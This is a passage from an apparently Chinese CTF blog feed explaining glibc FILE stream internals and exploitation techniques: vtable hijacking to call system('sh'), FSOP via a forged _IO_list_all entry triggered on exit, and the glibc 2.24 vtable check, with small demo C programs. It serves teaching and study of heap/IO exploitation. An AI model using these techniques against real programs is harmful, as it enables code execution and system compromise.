*) buf, request);</span><br></pre></td></tr></table></figure><p>在<code>\_IO_XSPUTN</code> 对应的默认函数<code>\_IO_new_file_xsputn</code> 中会调用同样位于 vtable 中的<code>_IO_OVERFLOW</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br></pre></td></tr></table></figure><p><code>\_IO_OVERFLOW</code> 默认对应的函数是<code>_IO_new_file_overflow</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br></pre></td></tr></table></figure><p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数。</p><h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h4><p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>filename: 目标文件的路径</li><li>type: 打开方式的类型</li><li>返回值: 返回一个文件指针</li></ul><p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p><p>首先在 fopen 对应的函数_fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br></pre></td></tr></table></figure><p>之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">_IO_file_init (&amp;new_f-&gt;fp);</span><br></pre></td></tr></table></figure><p>在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (fp)</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *<span class="title">fp</span>;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后_fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure><p>总结一下 fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h4 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h4><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">(FILE *stream)</span></span></span><br></pre></td></tr></table></figure><p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p><p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure><p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure><h4 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h4><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以<code>\n</code>结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vfprintf</span>+<span class="number">11</span></span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line"><span class="built_in">write</span></span><br></pre></td></tr></table></figure><p>下面记录一些攻击技术。</p><h3 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>前面我们介绍了 Linux 中文件流的特性（FILE），我们可以得知 Linux 中的一些常见的 IO 操作函数都需要经过 FILE 结构进行处理。尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p><p>因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p><p>因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，对于 fopen 的情况是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">"123.txt"</span>,<span class="string">"rw"</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=<span class="number">0x41414141</span> <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"call 0x41414141"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据 vtable 在_IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后需要搞清楚欲劫持的 IO 函数会调用 vtable 中的哪个函数。关于 IO 函数调用 vtable 的情况已经在 FILE 结构介绍一节给出了，知道了 printf 会调用 vtable 中的 xsputn，并且 xsputn 是 vtable 中的第八项之后就可以写入这个指针进行劫持。</p><p>并且在 xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。比如这例子调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。</p><p>利用这点可以实现给劫持的 vtable 函数传參，比如：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">"123.txt"</span>,<span class="string">"rw"</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    memcopy(fp,<span class="string">"sh"</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">"hi"</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">"123.txt"</span>,<span class="string">"rw"</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">"sh"</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">"hi"</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</p><p>因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p><p>同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> &amp;_IO_2_1_stdin_</span><br><span class="line">$<span class="number">2</span> = (struct _IO_FILE_plus *) <span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0x00007ffff7a0d000</span> <span class="number">0x00007ffff7bcd000</span> <span class="number">0x0000000000000000</span> r-x /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0x00007ffff7bcd000</span> <span class="number">0x00007ffff7dcd000</span> <span class="number">0x00000000001c0000</span> --- /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0x00007ffff7dcd000</span> <span class="number">0x00007ffff7dd1000</span> <span class="number">0x00000000001c0000</span> r-- /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line"><span class="number">0x00007ffff7dd1000</span> <span class="number">0x00007ffff7dd3000</span> <span class="number">0x00000000001c4000</span> rw- /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br></pre></td></tr></table></figure><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。</p><p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ul><li>1、当 libc 执行 abort 流程时</li><li>2、当执行 exit 函数时</li><li>3、当执行流从 main 函数返回时</li></ul><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>梳理一下 FSOP 利用的条件，首先需要攻击者获知 libc.so 基址，因为_IO_list_all 是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写_IO_list_all。</p><p>之后需要用任意地址写把_IO_list_all 的内容改为指向我们可控内存的指针，</p><p>之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>也就是：</p><ul><li>fp-&gt;_mode &lt;= 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的 vtable 和_IO_FILE_plus。 为了绕过验证，我们提前获得了_IO_write_ptr、_IO_write_base、_mode 等数据域的偏移，这样可以在伪造的 vtable 中构造相应的数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用分配内存的前 0x100 个字节作为_IO_FILE，后 0x100 个字节作为 vtable，在 vtable 中使用 0x41414141 这个地址作为伪造的_IO_overflow 指针。</p><p>之后，覆盖位于 libc 中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。</p><p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush 获取_IO_list_all 的值并取出作为_IO_FILE_plus 调用其中的_IO_overflow</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">---&gt; call _IO_overflow</span><br><span class="line">[#<span class="number">0</span>] <span class="number">0x7ffff7a89193</span> → Name: _IO_flush_all_lockp(do_lock=<span class="number">0x0</span>)</span><br><span class="line">[#<span class="number">1</span>] <span class="number">0x7ffff7a8932a</span> → Name: _IO_cleanup()</span><br><span class="line">[#<span class="number">2</span>] <span class="number">0x7ffff7a46f9b</span> → Name: __run_exit_handlers(status=<span class="number">0x0</span>, listp=&lt;optimized <span class="keyword">out</span>&gt;, run_list_atexit=<span class="number">0x1</span>)</span><br><span class="line">[#<span class="number">3</span>] <span class="number">0x7ffff7a47045</span> → Name: __GI_exit(status=&lt;optimized <span class="keyword">out</span>&gt;)</span><br><span class="line">[#<span class="number">4</span>] <span class="number">0x4005ce</span> → Name: main()</span><br></pre></td></tr></table></figure><h3 id="glibc-2-24-下-IO-FILE-的利用"><a href="#glibc-2-24-下-IO-FILE-的利用" class="headerlink" title="glibc 2.24 下 IO_FILE 的利用"></a>glibc 2.24 下 IO_FILE 的利用</h3><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="keyword">void</span> _IO_vtable_check (<span class="keyword">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 <code>vtable - __start___libc_IO_vtables</code> 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">"Fatal error: glibc detected an invalid stdio handle\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。</p><p>这里的检查使得以往使用 vtable 进行利用的技术很难实现，不过存在新的利用技术。</p><h4 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h4><p>在 vtable 难以被利用之后，利用的关注点从 vtable 转移到_IO_FILE 结构内部的域中。 前面介绍过_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。</p><p>在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="二进制" scheme="http://ggb0n.cool/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="IO_FILE漏洞" scheme="http://ggb0n.cool/tags/IO-FILE%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Tcache_Attack</title>
    <link href="http://ggb0n.cool/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Tcache_Attack/"/>
    <id>http://ggb0n.cool/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Tcache_Attack/</id>
    <published>2020-06-06T16:48:19.000Z</published>
    <updated>2020-06-06T16:50:51.241Z</updated>
    
